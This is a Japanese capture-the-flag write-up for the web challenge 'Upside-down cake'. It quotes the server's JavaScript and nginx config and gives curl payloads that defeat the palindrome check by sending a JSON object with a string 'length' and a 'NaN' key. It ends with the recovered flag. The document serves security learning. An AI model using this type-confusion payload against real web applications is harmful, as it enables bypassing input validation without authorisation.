# Upside-down cake:web:100pts
設定が正しいか、413回チェックしました。  

[http://34.84.176.251:12349](http://34.84.176.251:12349)  

初心者向けヒント  
- とりあえず、上のリンクを開いて、適当に操作してみてください。この問題は「非常に長い回文」をサーバーに送ることでフラグが手に入ると主張していますが、話はそんなに単純ではないことがすぐに分かります。  
- 次に、添付したソースコードを読んでください。`main.mjs` や `nginx.conf` といったファイルにこのウェブサイトの重要なロジックが記述されています。`flag` という変数にフラグが保存されているので、この値をリークすることが目的となります。  
- これらのヒントを元に、「非常に長い回文」をサーバーに送るのではなく、何かしらのバグを突くことによってフラグを手に入れる方法を考えましょう。Web技術、特にJavaScriptについての知識が必要になるかもしれないので、必要に応じてMDNなどのドキュメントを参照してください。  
- なお、この問題を解くのに大量のアクセスをする必要はありません。ルールに書かれている通り、DoS まがいの大量アクセスはご遠慮ください。  

[upside-down_cake.tar.gz](upside-down_cake.tar.gz)  

# Solution
URLとソースコード一式が配布される。  
アクセスすると、"長い回文を送ればフラグが得られる"とある。  
![site1.png](site/site1.png)  
試しに`s`を100個送信すると、以下のように413 Request Entity Too Largeで怒られる。  
![site2.png](site/site2.png)  
ソースを見ると、main.mjsの主要部分は以下のようであった。  
```js
~~~
const flag = process.env.FLAG ?? 'DUMMY{DUMMY}';

const validatePalindrome = (string) => {
	if (string.length < 1000) {
		return 'too short';
	}

	for (const i of Array(string.length).keys()) {
		const original = string[i];
		const reverse = string[string.length - i - 1];

		if (original !== reverse || typeof original !== 'string') {
			return 'not palindrome';
		}
	}

	return null;
}

const app = new Hono();

app.get('/', serveStatic({root: '.'}));

app.post('/', async (c) => {
	const {palindrome} = await c.req.json();
	const error = validatePalindrome(palindrome);
	if (error) {
		c.status(400);
		return c.text(error);
	}
	return c.text(`I love you! Flag is ${flag}`);
});
~~~
```
`string.length`が1000以上である回文を送ればフラグが得られるようだ。  
同じくソースのnginx.confを確認する。  
```conf
events {
	worker_connections 1024;
}

http {
	server {
		listen 0.0.0.0:12349;
		client_max_body_size 100;
		location / {
			proxy_pass http://app:12349;
			proxy_read_timeout 5s;
		}
	}
}
```
先ほどの413 Request Entity Too Largeは`client_max_body_size 100;`に引っかかっているようだ。  
bodyが100以下かつlengthが1000以上な回文の送信は不可能である。  
ここで、リクエストよりpalindromeのlengthを指定できないかと考える。  
```bash
$ curl -X POST -H "Content-Type: application/json" http://34.84.176.251:12349/ -d '{"palindrome":{"length": 1}}'
too short
$ curl -X POST -H "Content-Type: application/json" http://34.84.176.251:12349/ -d '{"palindrome":{"length": 1000}}'
not palindrome
```
応答よりlengthを指定した場合、任意の値の指定に成功しているようだ。  
次に回文のチェック箇所だが、同じくpalindromeの添え字の数字を`{"palindrome":{"length": 1000, "0": "s", "999": "s"}}`のように指定してやればよい。  
ただし、lengthが1000である場合、大量の添え字を指定しなければならないため、bodyが100以下であるという条件を満たせない。  
ここで、lengthを文字列にする場合を考える。  
`string.length < 1000`はfalseであり、`for (const i of Array(string.length).keys())`も0のみのループとなる。  
注意点として、`string.length - i - 1`がNaNとなるが、NaN自体を添え字として指定してやればよい。  
以下のように行う。  
```bash
$ curl -X POST -H "Content-Type: application/json" http://34.84.176.251:12349/ -d '{"palindrome":{"length": "s", "0": "s", "NaN": "s"}}'
I love you! Flag is TSGCTF{pilchards_are_gazing_stars_which_are_very_far_away}
```
flagが得られた。  

## TSGCTF{pilchards_are_gazing_stars_which_are_very_far_away}